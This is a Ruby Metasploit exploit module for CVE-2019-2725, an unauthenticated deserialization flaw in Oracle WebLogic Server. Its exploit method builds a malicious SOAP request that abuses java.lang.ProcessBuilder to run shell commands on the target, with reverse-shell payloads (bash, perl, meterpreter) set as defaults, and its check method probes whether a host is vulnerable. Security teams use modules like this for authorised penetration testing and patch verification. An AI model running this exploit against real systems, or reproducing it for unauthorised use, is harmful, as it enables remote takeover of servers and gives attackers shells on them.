##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Powershell

  def initialize(info={})
    super(update_info(info,
      'Name' => 'Oracle Weblogic Server Deserialization RCE - AsyncResponseService ',
      'Description' => %q{
        An unauthenticated attacker with network access to the Oracle Weblogic Server T3
        interface can send a malicious SOAP request to the interface WLS AsyncResponseService
        to execute code on the vulnerable host.
      },
      'Author' =>
        [
        'Andres Rodriguez - 2Secure (@acamro) <acamro[at]gmail.com>',  # Metasploit Module
        ],
      'License' => MSF_LICENSE,
      'References' =>
        [
          ['CVE', '2019-2725'],
          ['CNVD-C', '2019-48814'],
          ['URL', 'http://www.cnvd.org.cn/webinfo/show/4999'],
          ['URL', 'https://www.oracle.com/technetwork/security-advisory/alert-cve-2019-2725-5466295.html']
        ],
      'Privileged' => false,
      'Platform' => %w{ unix win solaris },
      'Targets' =>
        [
          [ 'Unix',
            'Platform' => 'unix',
            'Arch' => ARCH_CMD,
            'DefaultOptions' => {'PAYLOAD' => 'cmd/unix/reverse_bash'}
          ],
          [ 'Windows',
            'Platform' => 'win',
            'Arch' => [ARCH_X64, ARCH_X86],
            'DefaultOptions' => {'PAYLOAD' => 'windows/meterpreter/reverse_tcp'}
          ],
          [ 'Solaris',
            'Platform' => 'solaris',
            'Arch' => ARCH_CMD,
            'DefaultOptions' => {'PAYLOAD' => 'cmd/unix/reverse_perl'},
            'Payload' => {
              'Space'       => 2048,
              'DisableNops' => true,
              'Compat'      =>
                {
                  'PayloadType' => 'cmd',
                  'RequiredCmd' => 'generic perl telnet',
                }
            }
          ]
        ],
      'DefaultTarget' => 0,
      'DefaultOptions' =>
        {
          'WfsDelay' => 12
        },
      'DisclosureDate' => 'Apr 23 2019'))

    register_options(
      [
        Opt::RPORT(7001),
        OptString.new('URIPATH', [false, 'URL to the weblogic instance (leave blank to substitute RHOSTS)', nil]),
        OptString.new('WSPATH', [true, 'URL to AsyncResponseService', '/_async/AsyncResponseService'])
      ]
    )
  end

  def check
    res = send_request_cgi(
      'uri'      => normalize_uri(datastore['WSPATH']),
      'method'   => 'POST',
      'ctype'    => 'text/xml',
      'headers'  => {'SOAPAction' => '' }
    )

    if res && res.code == 500 && res.body.include?("<faultcode>env:Client</faultcode>")
      vprint_status("The target returned a vulnerable HTTP code: /#{res.code}")
      vprint_status("The target returned a vulnerable HTTP error: /#{res.body.split("\n")[0]}")
      Exploit::CheckCode::Vulnerable
    elsif res && res.code != 202
      vprint_status("The target returned a non-vulnerable HTTP code")
      Exploit::CheckCode::Safe
    elsif res.nil?
      vprint_status("The target did not respond in an expected way")
      Exploit::CheckCode::Unknown
    else
      vprint_status("The target returned HTTP code: #{res.code}")
      vprint_status("The target returned HTTP body: #{res.body.split("\n")[0]} [...]")
      Exploit::CheckCode::Unknown
    end
  end

  def exploit
    print_status("Generating payload...")
    case target.name
    when 'Windows'
      string0_cmd = 'cmd.exe'
      string1_param = '/c'
      shell_payload = cmd_psh_payload(payload.encoded, payload_instance.arch.first, {remove_comspec: true, encoded: false })
    when 'Unix','Solaris'
      string0_cmd = '/bin/bash'
      string1_param = '-c'
      shell_payload = payload.encoded
    end

    random_action = rand_text_alphanumeric(20)
    random_relates = rand_text_alphanumeric(20)

    soap_payload =  %Q|<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"|
    soap_payload <<   %Q|xmlns:wsa="http://www.w3.org/2005/08/addressing"|
    soap_payload <<   %Q|xmlns:asy="http://www.bea.com/async/AsyncResponseService">|
    soap_payload <<   %Q|<soapenv:Header>|
    soap_payload <<     %Q|<wsa:Action>#{random_action}</wsa:Action>|
    soap_payload <<     %Q|<wsa:RelatesTo>#{random_relates}</wsa:RelatesTo>|
    soap_payload <<     %Q|<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">|
    soap_payload <<       %Q|<void class="java.lang.ProcessBuilder">|
    soap_payload <<         %Q|<array class="java.lang.String" length="3">|
    soap_payload <<           %Q|<void index="0">|
    soap_payload <<             %Q|<string>#{string0_cmd}</string>|
    soap_payload <<           %Q|</void>|
    soap_payload <<           %Q|<void index="1">|
    soap_payload <<             %Q|<string>#{string1_param}</string>|
    soap_payload <<           %Q|</void>|
    soap_payload <<           %Q|<void index="2">|
    soap_payload <<             %Q|<string>#{shell_payload.encode(xml: :text)}</string>|
   #soap_payload <<             %Q|<string>#{xml_encode(shell_payload)}</string>|
    soap_payload <<           %Q|</void>|
    soap_payload <<         %Q|</array>|
    soap_payload <<       %Q|<void method="start"/>|
    soap_payload <<       %Q|</void>|
    soap_payload <<     %Q|</work:WorkContext>|
    soap_payload <<   %Q|</soapenv:Header>|
    soap_payload <<   %Q|<soapenv:Body>|
    soap_payload <<     %Q|<asy:onAsyncDelivery/>|
    soap_payload <<   %Q|</soapenv:Body>|
    soap_payload << %Q|</soapenv:Envelope>|

    uri = normalize_uri(datastore['WSPATH'])
    if uri.nil?
      datastore['URIPATH'] = "http://#{RHOST}:#{RPORT}/"
    end

    print_status("Sending payload...")

    begin
      res = send_request_cgi(
        'uri'      => uri,
        'method'   => 'POST',
        'ctype'    => 'text/xml',
        'data'     => soap_payload,
        'headers'  => {'SOAPAction' => '' }
      )
    rescue Errno::ENOTCONN
      fail_with(Failure::Disconnected, "The target forcibly closed the connection, and is likely not vulnerable.")
    end

    if res.nil?
      fail_with(Failure::Unreachable, "No response from host")
    elsif res && res.code != 202
      fail_with(Failure::UnexpectedReply,"Exploit failed.  Host did not responded with HTTP code #{res.code} instead of HTTP code 202")
    end
  end
end
